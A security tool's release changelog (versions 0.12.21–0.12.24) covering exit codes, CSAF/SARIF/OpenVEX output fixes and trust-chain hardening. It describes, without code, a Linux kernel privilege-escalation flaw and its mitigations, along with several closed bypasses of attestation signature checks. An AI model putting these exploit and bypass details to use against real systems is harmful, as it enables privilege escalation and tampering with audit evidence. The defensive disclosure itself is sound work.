- **`lib/exit-codes.js` is the single source of truth.** Every `process.exitCode = N` site in `bin/exceptd.js` references `EXIT_CODES.LOCK_CONTENTION` / `STORAGE_EXHAUSTED` / `SESSION_ID_COLLISION` etc. instead of bare numbers. `exceptd doctor --exit-codes` dumps the map so docs cannot drift from runtime.
- **Exit-code 3 overload split.** Pre-v0.12.24 exit 3 meant both "session-id collision" (cmdRun) AND "ran-but-no-evidence" (cmdCi). Session-id collision now uses `SESSION_ID_COLLISION = 7`; ran-but-no-evidence keeps `RAN_NO_EVIDENCE = 3`.
- **`cmdRunMulti` propagates `lock_contention`** from per-playbook persist failure into the aggregate `process.exitCode = 8`. Previously the aggregate gate collapsed every persist failure to 1, hiding the lock-busy signal that callers retry on.
- **ENOSPC vs EEXIST distinction.** Storage exhaustion (`ENOSPC` / `EROFS` / `EDQUOT`) on lockfile or attestation write now sets `process.exitCode = 9 STORAGE_EXHAUSTED` with `body.storage_exhausted = true`. Operator runbooks looping on 8/retry through a full disk now branch on the right signal.
- **`run --all` aggregate precedence:** `LOCK_CONTENTION > STORAGE_EXHAUSTED > GENERIC_FAILURE`.

### Bundle correctness (CSAF / SARIF / OpenVEX)

- **CSAF `product_tree.branches[]`** synthesised as a 3-level vendor → product_name → product_version hierarchy from either a new optional `affected_products[{ vendor, product, version }]` catalog field or a heuristic parse of the existing `affected_components[]` strings. Closes the ENISA conformance gap.
- **Strict CVSS 3.x vector parse.** `parseCvss31Vector(v)` accepts both versions CSAF 2.0 cvss_v3 permits (3.0 and 3.1) and validates the full grammar. Malformed vectors (`AV:X`, unknown metric values, out-of-order metrics) and unsupported versions (2.0, 4.0) skip the `cvss_v3` block and emit `csaf_cvss_invalid` to `runtime_errors[]`.
- **OpenVEX URN routing by id prefix.** `vulnIdToUrn(id)` routes `CVE-*` → `urn:cve:`, `GHSA-*` → `urn:ghsa:`, `RUSTSEC-*` → `urn:rustsec:`, `MAL-*` → `urn:malicious-package:`, everything else → `urn:exceptd:advisory:`. Pre-v0.12.24, GHSA/RUSTSEC/MAL all emitted under `urn:cve:` and downstream VEX ingesters resolved them against the CVE List incorrectly.
- **OpenVEX `status: fixed`** carries an `impact_statement` trail referencing the operator's evidence (e.g. `Operator verified fixed via evidence_hash=<sha256[:16]>`).
- **`--tlp <CLEAR|GREEN|AMBER|AMBER+STRICT|RED>`** populates CSAF `document.distribution.tlp.label`. When omitted, the field is absent entirely. MISP / Trusted-Repository consumers gating on TLP no longer reject the document.
- **SARIF `invocations[].executionSuccessful`** reflects classification (`false` when inconclusive). Pre-v0.12.24 hard-coded `true`.

### Engine internals

- **`runtime_errors[]` capped + per-kind deduped.** New helper `pushRunError(arr, entry, opts)` replaces 13 push sites. Per-kind cap defaults to 100; total cap 1000; overflow records as a `_truncated` sentinel. Closes the 39 MB worst-case attestation bloat under pathological catalog states.
- **`live_patch_tools[]` schema split.** New optional `vendor_update_paths[]` field separates true live-patch tools (kpatch, kGraft, Canonical Livepatch) from vendor-update mechanisms (npm yank, IDE update, package version pin). RWEP `live_patch_available` factor remains gated on the narrower `live_patch_tools[]`, so the score no longer over-credits vendor-update-only entries.

### CLI surface

- **`attest prune <session-id>` verb** removes an attestation session. Modes: `--force` (specific session), `--all-older-than <days> --force` (bulk), `--playbook <id>` (scoped), `--dry-run` (list without delete). Refuses `.` / `..` / all-dots ids and paths that resolve outside the attestation root.
- **Levenshtein flag-typo suggestions.** Unknown flags trigger a per-verb allowlist lookup; suggestions fire at edit distance ≤ 2 AND ≤ flag.length/2. `--evidnce ev.json` now sees `{ ok: false, error: 'unknown flag --evidnce', suggested: 'evidence' }`.
- **Missing-value detection.** Value-bearing flags that parsed as `true` (i.e. no value) emit `--<flag> requires a value`.
- **Help-text completeness.** `run`, `ai-run`, `ingest`, `run-all` help blocks document `--vex` / `--evidence-dir` / `--attestation-root` / `--mode`. `ai-run --help` adds an exit-code table (0/1/3/8/9). `ci --help` exit-code table corrected to omit 6/8 (cmdCi cannot emit them). Top-level `exceptd help` adds unknown-verb exit 2. `attest --help` documents `--since` under `list`; corrects `export --format` enumeration to match implementation.
- **`discover` / `ask`** document "always exits 0" so CI gates branch on JSON shape rather than exit code.

### Error-message UX

- **`dispatchPlaybook` catch-all, `cmdAiRun` runner-threw, `cmdLint` catch, `cmdReattest replay.reason` falsy path, `cmdRun` "no playbook resolved", `attest <subverb>` missing session-id** all wrap bare `e.message` with verb name + remediation hint pointing at the issue tracker.
- **Six sites of "playbook X has no directives"** consolidated into a shared helper.
- **JSON-mode stderr bypass sites** at `cmdRun` persist failure / `cmdIngest` persist failure / `cmdCi --format` validation route through `emitError` for consistent ok-false → exit-code mapping.

### Hard Rule #5 — global-first quality

- **`framework.json`** `framework_lag_declaration` rewritten with substantive per-framework gaps (NIST CA-7, EU NIS2 Art.21(2), UK CAF Principle A, AU Essential 8 Strategy 1, ISO/IEC 27001:2022 A.5.1). The meta-playbook now models the pattern instead of paper-name-dropping the frameworks.
- **`containers.json`** AU clause: E8 Strategy 1 Application Control bound to OPA/Kyverno privileged-pod admission (replaces the prior "Macro Settings by analogy" mismatch).
- **`crypto-codebase.json`** UK CAF C.5 + PSTI gap explicit: CAF mandates outcome-tested cryptography but doesn't require PQC-by-default / constant-time / KDF minima; PSTI scope is connected products only.
- **`library-author.json`** CAF C1.b + E8 Strategy 5 specific gaps (no SLSA L3+ provenance requirement; admin-privilege restriction doesn't reach build-time signing-key access).
- **`secrets.json`** adds NIST IA-5 with detection-of-credentials-in-source gap; E8 alignment shifts to Strategy 1 Application Control (restricting CI agent secret-store reads) instead of MFA (which static bearer tokens bypass). Adds 4 AU `per_framework_gaps[]` entries (Strategy 1 / Strategy 4 / ISM-1546 / ISM-1559) with compliance-theater tests embedded.
- **`hardening.json`** adds NIS2 Art.21(2)(c) + DORA Art.9(4) hardening-attestation gap.

### Operator-facing docs

- **`engines.node`** widened from `>=24.0.0` to `>=22.11.0`. Node 22 LTS through Apr 2027 is the corporate default; the prior pin excluded most enterprise installs.
- **Keywords** add `csaf-2.0`, `openvex`, `sarif`, `ed25519`, `provenance`, `attestation` (22 → 28 entries, alphabetised).
- **README install section** adds a "First run" snippet (`exceptd doctor --signatures` + fingerprint pin + npm provenance verify). New `agents/` description documents the markdown role-card scaffolding for skill authors.
- **CHANGELOG retroactive cleanup.** Operator-facing slot-token leakage removed from the v0.12.21 and v0.12.23 Internal sections.
- **`MAINTAINERS.md`** version-pinned subheadings collapsed into a single "High-trust skill paths" list.
- **Landing site (https://exceptd.com/)** refreshed: `softwareVersion: 0.12.24`, "35 jurisdictions" across every body-copy occurrence (was "34"), `exceptd plan` → `exceptd brief --all`, `exceptd scan` → `exceptd discover`, "13-gate predeploy" → "14-gate predeploy".

### Internal — test infra hardening

- **`tests/_helpers/snapshot-restore.js`** new helper. `withFileSnapshot([paths], async () => {...})` wraps mutation tests; restoration fires on normal completion, thrown error, SIGINT, SIGTERM, and `process.exit`. Closes the historical "smoke test mutates state, SIGINT skips finally, leaves polluted file on disk" class.
- **20+ coincidence-passing `notEqual(r.status, 0)` test sites pinned** to exact exit codes across `predeploy-gate-coverage`, `operator-bugs`, `build-incremental`, `refresh-swarm`, `orchestrator-audit-f`, `cli-coverage`, `prefetch`.
- **`scripts/check-test-coverage.js` predeploy gate extended** with a `coincidence-assert` ban: any new `assert.notEqual(*.status, *)` site fails the gate unless the same line carries `// allow-notEqual: <reason>`.
- **14 `audit-*-fixes.test.js` files renamed** to behavior-framed names (`runtime-errors-and-vex-disposition`, `attestation-trust-boundary`, `csaf-bundle-correctness`, `cli-flag-validation`, `playbook-runner-error-paths`, `framework-gap-completeness`, `rwep-scoring-edge-cases`, `cli-subverb-dispatch`, `openvex-emission`, `predeploy-gate-coverage`, `cli-exit-codes`, `playbook-schema-validation`, `attestation-signature-roundtrip`, `cve-catalog-shape`).
- **New coverage**: `cli-playbook-traversal.test.js`, `attest-verify-replay-isolation.test.js`, `cmd-run-multi-lock-contention.test.js`, `openvex-urn-routing.test.js`, `lib-exit-codes.test.js`, `lib-id-validation.test.js`, `lib-flag-suggest.test.js`.

Test count: 995 → 1043 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.

## 0.12.23 — 2026-05-15

**Patch: doc-vs-code reconciliation, trust-chain pin loader hardening, attest list/show replay isolation, global-first framework coverage backfill.**

### Trust chain

- **`loadExpectedFingerprintFirstLine` refuses UTF-16LE / UTF-16BE pin files.** Saving `keys/EXPECTED_FINGERPRINT` via PowerShell `Set-Content -Encoding UTF16LE` (or any tool emitting a UTF-16 BOM) previously caused every consumer (verify, refresh-network, verify-shipped-tarball, attest pin) to decode the file as UTF-8 mojibake; the first line never matched a live fingerprint and operators saw no signal that the encoding was wrong. The loader now detects the FF FE / FE FF byte signatures, returns null, and routes through the existing "no-pin" warn-and-continue path so the error is surfaced without bricking the gate. UTF-8 and UTF-8-with-BOM remain supported.
- **`KEYS_ROTATED=1` override now emits a `process.emitWarning('EXCEPTD_KEYS_ROTATED_OVERRIDE', ...)`** at every site that accepts the bypass (`bin/exceptd.js` attestation pin, `lib/refresh-network.js` refresh-network swap gate). Previously the env var was a silent skip; operators who set it once for a legitimate rotation and forgot to commit the new pin had no surface signal on subsequent runs. The mismatch values are echoed in the warning so log scrapers can confirm intended rotation. `lib/verify.js` and `scripts/verify-shipped-tarball.js` already emitted warnings at this gate and are unchanged.

### Engine + CLI

- **`attest list` and `attest show` filter `kind: 'replay'` records out of the session attestations array.** v0.12.22 added signed `replay-<iso>.json` audit records under `.exceptd/attestations/<sid>/`, which the listing/show loops were treating as additional sessions (or duplicate attestation entries) with `evidence_hash: null` and `captured_at: null`. Records are now partitioned by parsed `kind` field — replay records appear under a new `attestation_replays[]` array on `attest show` output and are omitted entirely from `attest list`. Gating on the parsed `kind` field (not filename prefix) closes the rename-smuggle vector.
- **`--session-id .` / `..` / all-dots refused after regex pass.** The `/^[A-Za-z0-9._-]{1,64}$/` validator accepted any string of dots, which resolved into or above the attestation root. The CLI now explicitly refuses all-dots session ids with a structured error.

### Help text and exit-code surface

- **`ingest`, `ai-run`, and `run-all` help blocks document `--csaf-status` and `--publisher-namespace`.** v0.12.22's `BUNDLE_FLAG_RELEVANT_VERBS` set wired the flags into all five bundle-emitting verbs but only the `run` and `ci` help blocks listed them; operators on the other three verbs had to read the source to find them.
- **Exit-code tables completed across the help surface.** Top-level `exceptd help` for `ci` now lists 0/1/2/3/4/5/6/8 instead of 0/2/3/4/5/1. Per-verb tables for `ci`, `attest verify`, and `reattest` now document `6 — TAMPERED` and `8 — LOCK_CONTENTION` where applicable. `run --help` adds a `6-7 — reserved` line so the gap doesn't read as accidental.

### Hard Rule #5 — global-first coverage

- **Eleven playbooks backfilled with UK CAF + AU Essential 8 / ACSC / ISM clauses** in `phases.direct.framework_lag_declaration` (`secrets`, `ai-api`, `containers`, `cred-stores`, `crypto`, `kernel`, `mcp`, `runtime`, `sbom` — both CAF and E8 added; `crypto-codebase` — E8 added on top of existing CAF; `hardening` — CAF added on top of existing E8). The v0.12.21 entry claimed this coverage was already in place; only `framework.json` and `library-author.json` actually had it. All 13 playbooks now declare CAF + E8 framework-lag posture alongside NIST and ISO.

### Operator-facing docs

- **README, AGENTS.md, ARCHITECTURE.md, and CONTEXT.md reconciled with the v0.11+ canonical CLI surface.** The deprecation banner heading on legacy v0.10.x verbs now states "scheduled for removal in v0.13" (not "removed in v0.12" — the verbs remain registered with deprecation warnings). README body examples replace `exceptd verify` / `exceptd scan` / `validate-cves` / `validate-rfcs` with `exceptd doctor --signatures` / `exceptd discover` / `doctor --cves` / `doctor --rfcs`. AGENTS.md CLI reference table replaces the stale v0.10.x verb set (`plan`/`govern`/`direct`/`look`/`ingest`/`reattest`/`list-attestations`) with the v0.11+ canonical surface (`brief`/`run`/`ai-run`/`run-all`/`ci`/`discover`/`ask`/`reattest <sid>`/`attest verify|list|show`/`doctor`/`lint`). CONTEXT.md catalog inventory aligned with actual catalog state (10 CVE, 62 framework-control-gap, 35 jurisdictions, 55 CWE, 28 D3FEND, 31 RFC, 22 DLP entries) and a new "Playbooks and the Seven-Phase Contract" section enumerates the 13 playbooks and the govern → direct → look → detect → analyze → validate → close contract.
- **Predeploy gate count corrected from "15" to "14"** across AGENTS.md, ARCHITECTURE.md, and README. The predeploy gate set ships 14 gates per `scripts/predeploy.js`; the "15th" framing was an off-by-one carryover from an earlier draft of the diff-coverage gate that landed as the 13th rather than appended. The diff-coverage gate position is also corrected from "14th" to "13th" in AGENTS.md Hard Rule #15 and ARCHITECTURE.md (the validate-playbooks gate sits at position 14).
- **AGENTS.md CLI reference table now lists `brief --all` and `attest diff <sid>`** as canonical, with `plan` and `reattest` marked as deprecated aliases scheduled for removal in v0.13 (consistent with how the v0.10.x `govern`/`direct`/`look` verbs are surfaced).
- **AGENTS.md "Seven-phase playbook contract" intro** drops the "direct CLI verbs are landing in a follow-up task" prose — the verbs landed in v0.11.0. Points readers at `exceptd brief` / `exceptd run` / `exceptd ai-run` plus the library entry point at `lib/playbook-runner.js`.
- **CONTEXT.md phase-contract table** now references `exceptd brief <playbook> --phase {govern,direct,look}` for phases 1-3 (was `exceptd govern|direct|look`); the "How to Walk a Playbook" onboarding section is rewritten against the same canonical surface.
- **ARCHITECTURE.md CWE entry count** corrected from 51 to 55 (matches `data/cwe-catalog.json` and CONTEXT.md).
- **Jurisdiction count corrected from "37" / "34" to "35"** in the README badge, status copy, and catalog footnote. `data/global-frameworks.json` has 38 top-level keys but three are `_meta` / `_notification_summary` / `_patch_sla_summary` aggregates; the actual jurisdiction count is 35.

### Operations

- **`.github/workflows/atlas-currency.yml` declares `permissions:` at the job level** instead of the workflow root. Matches the project's OpenSSF Scorecard `TokenPermissionsID` posture (job-scoped least-privilege); top-level permission grants were the only remaining outlier across the repo's workflow set.

### Internal

- **Internal code comments stripped of stray maintenance-tracking tokens (no behavior change).**
- **Exit-code assertion in the UTF-16BE odd-length-payload test tightened** from `notEqual(r.status, 0)` to `assert.equal(r.status, 1)` per project anti-coincidence rule.

Test count and predeploy gates land alongside this entry; see the predeploy log on the release commit.

## 0.12.22 — 2026-05-15

## 0.12.22 — 2026-05-15

**Patch: trust-chain attestation sidecar redesign, CSAF spec-compliance fixes, CLI flag scoping, concurrency exit-code surface.**

### Trust chain

- **`.sig` sidecar shape reduced to signed-bytes only.** The previous shape carried `signed_at`, `signs_path`, and `signs_sha256` alongside the Ed25519 signature — but those fields were NOT covered by the signature (the signature signs the attestation file bytes, not the sidecar). An attacker who captured any valid sidecar could rewrite `signed_at` to lie about freshness or `signs_path` to point at a sibling attestation in the same session directory, and the signature still verified. Sidecar now carries `{algorithm, signature_base64, note}` (signed) or `{algorithm, signed: false, note}` (unsigned) only. Operators reading freshness use filesystem mtime; the attestation file's own `captured_at` field is signed.
- **`cmdReattest --force-replay` persists the override as a signed `replay-<isoZ>.json`** in the session directory alongside `attestation.json`. The previous shape emitted the override metadata only to stdout, so the audit trail vanished when the shell closed. `attest verify <session-id>` surfaces both the original attestation and any replay records so an auditor sees the full chain.
- **Sidecar verifier enforces `algorithm === 'Ed25519'` strictly.** Both `verifyAttestationSidecar` and `cmdAttest verify` previously fell through to `crypto.verify` for any non-`"unsigned"` algorithm value. A `null`, `"RSA-PSS"`, array, or omitted-field sidecar now surfaces `tamper_class: 'algorithm-unsupported'` and exits 6. Matches the strict gate already in place at `verifyManifestSignature`.
- **`hasReadableStdin` Windows fallback tightened to strict `=== false`** to close the wrapped-test-harness hang regression. The helper now requires `process.stdin.isTTY === false` (not falsy) on Windows when fstat reports size 0 on a non-FIFO non-socket non-character descriptor. POSIX pipes/FIFOs/sockets remain trusted via the `isFIFO()`/`isSocket()`/`isCharacterDevice()` probes added in v0.12.21.
- **`keys/EXPECTED_FINGERPRINT` pin loaders strip UTF-8 BOM.** Four sites (`bin/exceptd.js`, `lib/verify.js`, `lib/refresh-network.js`, `scripts/verify-shipped-tarball.js`) now share a single `loadExpectedFingerprintFirstLine` helper that strips a leading `U+FEFF` before splitting on newlines. A pin file saved via Notepad with `files.encoding: utf8bom` previously broke every verify path; the helper closes that DoS-by-encoding-roundtrip class.
- **`sanitizeOperatorText` (library entry point) NFC-normalizes and rejects Unicode `\p{C}`** (Cc/Cf/Cs/Co/Cn). The CLI-level guard added in v0.12.21 only fired on operator-supplied `--operator` input; library callers of `buildEvidenceBundle` bypassed the sanitization. The helper now uniformly returns null for inputs containing bidi-control / zero-width / surrogate / private-use / unassigned characters or empty-after-strip, and caps at 256 codepoints (not 256 UTF-16 code units, so astral-plane characters don't smuggle past).

### Bundles (CSAF / SARIF / OpenVEX)

- **CSAF `cvss_v3` block emitted only for `CVSS:3.0` / `CVSS:3.1` vectors.** Catalog entries carrying `CVSS:2.0/` or `CVSS:4.0/` vectors previously produced a `cvss_v3.version` of `'2.0'` / `'4.0'`, which violates the CSAF 2.0 schema enum `["3.0", "3.1"]`. Strict validators (BSI CSAF Validator) rejected the bundle. The block is now omitted for non-v3 vectors and a `bundle_cvss_v3_version_unsupported` runtime warning surfaces in `analyze.runtime_errors[]` so operators see the gap.
- **CSAF `vulnerabilities[].ids[]` routes `RUSTSEC-*` to `system_name: 'RUSTSEC'`**. Previously RUSTSEC advisories fell through to `system_name: 'OSV'` — mis-attributing the authority. Unknown prefixes (any advisory id not in the GHSA / MAL / OSV / SNYK / RUSTSEC set) now emit `system_name: 'exceptd-unknown'` so downstream tooling sees the authority wasn't recognized.
- **Non-string `cve_id` no longer emits literal `"null"` text.** Catalog entries whose `cve_id` is `null` / `undefined` / non-string are now omitted from `vulnerabilities[]` entirely, with a `bundle_cve_id_missing` runtime warning. Strict validators no longer see ghost vulnerabilities keyed on `text: "null"`.

### CLI

- **`--csaf-status` and `--publisher-namespace` refused on info-only verbs**. The flags were previously validated then silently dropped when invoked against `brief`, `list`, `attest`, `discover`, `doctor`, `lint`, etc. — same UX-trap class as the v0.12.21 `--ack` fix. The flags now refuse with a structured error pointing at the verb set that actually consumes them (`run`, `ci`, `run-all`, `ai-run`). Error messages also use the actual invoked verb as the prefix instead of a hardcoded `"run:"`.
- **`cmdRunMulti` consent gate now per-playbook**. The single-playbook `cmdRun` correctly gates `operator_consent` persistence on `classification === 'detected'`, but `cmdRunMulti` was persisting consent unconditionally across every iteration regardless of the iteration's own classification. Per-playbook consent gating now mirrors the single-run shape; mixed-classification `run-all --ack` runs persist consent only into the detected-playbook attestations.
- **UTF-16BE `readJsonFile` no longer leaks uninitialized buffer bytes.** The decoder used `Buffer.allocUnsafe` (uninitialized heap memory) and silently skipped the trailing byte on odd-length payloads — the decoded string then included whatever bytes happened to be on the heap at allocation time. Now uses `Buffer.alloc` (zero-initialized) and refuses odd-length payloads with a clear truncation error.
- **`run` and `ci` help text documents `--csaf-status` and `--publisher-namespace`**.

### Concurrency

- **`persistAttestation` lock contention exits 8 (`LOCK_CONTENTION`)** distinct from generic exit 1. The v0.12.21 entry claimed callers could distinguish lock-busy from hard failure via the `lock_contention: true` field, but `emit()`'s auto-mapping collapsed the exit code to 1. The function now sets `process.exitCode = 8` before returning, with `exit_code: 8` echoed in the result body. Exit-code table in `run --help` documents the code.
- **`acquireLock` reclaims same-PID stale lockfiles** older than 30 seconds. The previous PID-liveness probe skipped reclaim when the lockfile's recorded PID matched the current process's PID — but a same-process leak across multiple `run()` invocations left the lockfile orphaned indefinitely. The mtime-staleness check now allows reclaim while preserving legitimate reentrancy on fresh same-PID lockfiles.

### Test quality

- **5 exit-code assertions tightened from `notEqual(r.status, 0)` to exact-value `assert.equal(r.status, 1)`** across the CSAF and CLI-flag regression suites. Closes the same coincidence-passing-tests regression the v0.12.21 entry's tightening pass left half-done.
- **CVE-curation tests no longer mutate `data/cve-catalog.json`** in the repo root. Three tests previously injected synthetic `CVE-9999-*` drafts into the live catalog with a `finally{}` restore — a Ctrl-C between mutation and restoration leaked state into the repo. The refresh tests now use the existing `--catalog <path>` flag against a tempdir copy; the validate test uses the in-process module API directly.
- **Three e2e expect.json files** (`14-framework-jurisdiction-gap`, `16-containers-root-user`, `19-crypto-rsa-2048-eol`) now assert `phases.close.jurisdiction_notifications[0].jurisdiction` is populated. Field-presence-without-content was the previous shape.

### Catalog + skill content

- **`data/playbooks/runtime.json domain.cve_refs[]`** completes the Dirty-Frag family by adding `CVE-2026-43284` and `CVE-2026-43500` (already referenced by `kernel.json` and `hardening.json`).
- **`skills/threat-model-currency/skill.md`** inline `last_threat_review` date aligned to frontmatter (`2026-05-14`).

Test count: 941 → 995 (992 pass + 3 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.

## 0.12.21 — 2026-05-14

**Patch: Fragnesia (CVE-2026-46300) catalog + skill integration; trust-chain bypass closures; engine FP-gate extension; CSAF + SARIF + OpenVEX correctness; CLI fuzz; Hard Rule #5 global-first coverage; predeploy regression fix.**

### Catalog — Fragnesia

`CVE-2026-46300` (Fragnesia) added — a Linux kernel local privilege escalation disclosed 2026-05-13 by William Bowling / V12 security team. CVSS 7.8 / AV:L. The flaw is in the kernel XFRM ESP-in-TCP path: `skb_try_coalesce()` fails to propagate `SKBFL_SHARED_FRAG` when transferring paged fragments between socket buffers. An unprivileged user can deterministically rewrite read-only page-cache pages without modifying on-disk bytes — no race condition required. A public proof-of-concept demonstrates root shell via `/usr/bin/su`. Mitigation: blacklist or unload `esp4`, `esp6`, `rxrpc` kernel modules (the same set already documented for CVE-2026-31431); AlmaLinux + CloudLinux ship patched kernels in testing; live-patch is available via Canonical Livepatch, kpatch, kGraft, and CloudLinux KernelCare. RWEP today: 20 (will jump to 45 on CISA KEV listing).

The `kernel`, `runtime`, and `hardening` playbooks now reference Fragnesia in `domain.cve_refs[]`. Six skills carry cross-references: `kernel-lpe-triage`, `exploit-scoring`, `compliance-theater`, `framework-gap-analysis`, `zeroday-gap-learn`, `threat-model-currency`. `data/zeroday-lessons.json` adds three new control requirements that codify the lesson: page-cache integrity verification (file-integrity tools hashing on-disk bytes miss this class), bug-family mitigation persistence (operators who blacklisted modules for the parent bug remain mitigated for the sequel), and scanner paper-compliance test (a "patched" vulnerability-scanner report based on kernel-package version misses the module-unload mitigation surface).

### Trust chain

- **`algorithm: "unsigned"` sidecar substitution closed**. An attacker with write access to the attestation directory previously bypassed signed-tamper detection by overwriting `.sig` with `{"algorithm":"unsigned"}`. `attest verify` now refuses with exit 6 + `ok:false` when the substitution shape is detected on a host that has a private key present (legitimate unsigned attestations remain serviceable only on hosts where signing is intentionally disabled). `cmdReattest` requires explicit `--force-replay` to replay an explicitly-unsigned attestation regardless of host state; the persisted replay body records `sidecar_verify_class` and `force_replay: true`.
- **Corrupt-sidecar `.sig` JSON parse bypass closed**. Previously `cmdReattest` refused only on `reason === "no .sig sidecar"`; a truncated or malformed sidecar fell through to the benign branch. The refusal class now covers any non-clean verify reason. `cmdAttest verify` also wraps the sidecar `JSON.parse` so a corrupt sidecar exits 6 (TAMPERED) rather than exit 1 (generic).
- **`EXPECTED_FINGERPRINT` consulted inside `verifyManifestSignature`**. The pin previously fired only at the CLI tail; library callers (refresh-network gate, verify-shipped-tarball gate, tests, downstream consumers) bypassed it. The pin now gates manifest-envelope authentication at every load site. Honors `KEYS_ROTATED=1`; missing pin file remains warn-and-continue.

### Engine

- **Classification-override block extended to all override values**. The previous gate refused only `'detected'` overrides when an indicator with `false_positive_checks_required[]` was unsatisfied. An agent submitting `'clean'` or `'not_detected'` previously hid hits under a falsely-clean run verdict — strictly worse than the false-positive case the gate was meant to prevent. The substitution now applies to every override (`'detected' | 'clean' | 'not_detected' | 'inconclusive'`): when any indicator has unsatisfied FP checks, classification is forced to `'inconclusive'`. The `classification_override_blocked` runtime error records the offending indicator IDs and the count of unsatisfied checks (the literal check-name strings are no longer disclosed — they had been an attestation-bypass hint).
- **`vex_status: 'fixed'` propagation closed end-to-end**. The runner's bundle gates (CSAF `product_status: fixed` / OpenVEX `status: fixed`) previously never fired on operator runs: the `--vex` CLI consumed `vexFilterFromDoc()` for the `vex_filter` set but never read the `.fixed` companion property. The CSAF + OpenVEX `fixed` semantics introduced in v0.12.19 now actually engage when an operator submits a CycloneDX `analysis.state: resolved` or OpenVEX `status: fixed` statement.
- **`normalizeSubmission` flat-submission runtime errors reach `analyze.runtime_errors[]`**. The v0.12.19 promise to surface `signal_overrides_invalid` errors in the analyze phase was silently incomplete for flat-shape submissions (`{observations, verdict, signal_overrides}`); the constructed `out` object dropped the `_runErrors` accumulator. Errors are now threaded through both submission shapes.
- **Off-allowlist `detection_classification` values surface a runtime error**. `'present'`, `'unknown'`, `''`, case variants, leading/trailing whitespace, and other non-allowlist strings previously failed silent. They now push `classification_override_invalid` onto `runtime_errors[]`.
- **Proxy-throwing FP attestation no longer crashes detect()**. A malicious attestation whose getter throws is now caught: the indicator verdict downgrades to `'inconclusive'`, every required FP check is treated as unsatisfied, and a `fp_attestation_threw` runtime error records the indicator ID.

### Bundles (CSAF / SARIF / OpenVEX)

- **CSAF `tracking.status: 'interim'`** is the default for runtime emissions. `'final'` is an immutable-advisory marker; runtime detections without an operator review loop don't qualify. Operators promote to `final` via `--csaf-status final` after review. Strict validators (BSI CSAF Validator, Secvisogram) no longer refuse the bundles.
- **CSAF non-CVE identifiers routed correctly**. Per CSAF 2.0 §3.2.1.2 the `cve` field requires a strict CVE-ID shape. `MAL-2026-3083`, GHSA-*, RUSTSEC-* identifiers are now emitted under `ids: [{system_name, text}]` instead of misappropriating the `cve` field. Validators no longer reject the document.
- **CSAF `document.publisher.namespace`** now derives from `--publisher-namespace <url>` (new CLI flag) or, when omitted, from `--operator` if it parses as a URL. Without either, the bundle emits `urn:exceptd:operator:unknown` and pushes a `bundle_publisher_unclaimed` runtime warning. Operators are no longer misattributed to the tool vendor's marketing domain.
- **CSAF `document.tracking.generator`** populated with the exceptd engine + version; `publisher.contact_details` carries the validated `--operator` value when supplied.
- **`bundles_by_format` always populated**. The field was previously `null` when only the primary format was requested; multi-format-aware consumers had to special-case the no-extras shape.
- **CSAF `cvss_v3` block requires `vectorString`**. Per the CVSS v3.1 schema referenced by CSAF, the vector is mandatory. The block is now omitted when the vector is unavailable rather than emitting a partial structure that downstream tooling would reject.
- **SARIF `ruleId` prefixed with `<playbook-slug>/`**. Multi-playbook runs no longer collide on rule IDs (`framework-gap-0` from kernel-lpe and `framework-gap-0` from crypto-codebase are now distinct in GitHub Code Scanning dashboards).

### CLI

- **Stdin auto-detect uses `fstatSync` size probe** at `cmdRun`, `cmdIngest`, and `cmdAiRun --no-stream`. The previous truthy `!process.stdin.isTTY` check hung indefinitely on wrapped streams where `isTTY` was undefined but no data was piped (Mocha/Jest test harnesses, some Docker stdin-passthrough modes). The auto-detect now skips stdin when fstat reports size 0 on a non-TTY descriptor.
- **`--vex` accepts CycloneDX SBOMs without `vulnerabilities[]`**. A document with `bomFormat: "CycloneDX"` and no vulnerabilities array is now read as a zero-CVE VEX filter rather than refused. Operators with legitimate "no known vulnerabilities" SBOMs can now thread them through.
- **`--vex` and `--evidence` tolerate UTF-8 / UTF-16 BOMs**. A new shared `readJsonFile` helper detects the BOM (`FF FE` / `FE FF` / `EF BB BF`), decodes accordingly, strips the residual code point, and surfaces clean parse errors. Windows-generated CycloneDX documents (which routinely emit UTF-16LE or UTF-8 BOM) now parse correctly.
- **`--vex` enforces a 32 MiB size cap** with a clear error message (`exceeds 32 MiB limit (33,554,432 bytes)`).
- **`--operator` rejects Unicode bidi / format / control characters**. NFC-normalized input is validated against an allowlist that excludes Unicode general categories `Cc` (control), `Cf` (format — RTL override, zero-width, etc.), `Cs`, `Co`, `Cn`. Operator-identity forgery via right-to-left override or Zalgo is closed.
- **`--evidence-dir` refuses symbolic links, Windows directory junctions, and surfaces a warning on hardlinks**. The previous `lstatSync().isSymbolicLink()` gate missed Windows reparse-point junctions (which Node treats as directories) and gave no signal on hardlinked entries. A `realpathSync` check now enforces containment under the resolved directory; `nlink > 1` emits a defense-in-depth stderr warning.
- **`--ack` refused on non-clock verbs**. `brief`, `list`, and similar info-only verbs that don't engage jurisdiction-clock semantics now refuse the flag with a clear "irrelevant on this verb" error. On `run`, `--ack` is consumed only when classification is `'detected'`; on a `not_detected` run, consent persistence is skipped and `ack_skipped_reason` is surfaced.
- **`--help` text scrubbed**. The `ai-run` subverb help no longer carries internal-process vocabulary.

### CLI flag additions

- **`--csaf-status <interim|final>`** controls CSAF emission status.
- **`--publisher-namespace <url>`** sets the CSAF `document.publisher.namespace` field.

### Auto-discovery + curation

- **KEV-discovered draft predeploy regression closed**. `scoring.validate()` previously flagged every newly-imported KEV draft as score-diverged (the `buildScoringInputs` shape sets `poc_available: true` for the contribution while `buildKevDraftEntry` stores `null` on the draft for review). The validator now skips entries flagged `_auto_imported: true`; promoted entries are validated normally.
- **`--air-gap` CLI flag wired through `refresh-external`**. The flag was previously accepted only via `EXCEPTD_AIR_GAP=1` env. Both the `parseArgs` and `loadCtx` paths now thread `--air-gap` into `ctx.airGap`; GHSA + OSV diff applicators correctly skip network calls.
- **`cross-ref-api.byCve()` filters out auto-imported drafts by default**. An optional `{ include_drafts: true }` opt-in is available for the curation questionnaire path. Bundles, analyze, and other operator-facing surfaces no longer treat unreviewed drafts as authoritative.

### Concurrency

- **`cross-ref-api` cache invalidates on file mtime change**. The previous process-lifetime cache meant a long-running `orchestrator watch` process never observed catalog updates applied by an out-of-band `refresh-external --apply`. Each `loadCatalog` / `loadIndex` call now compares the cached mtime against `fs.statSync`; mismatch re-parses.
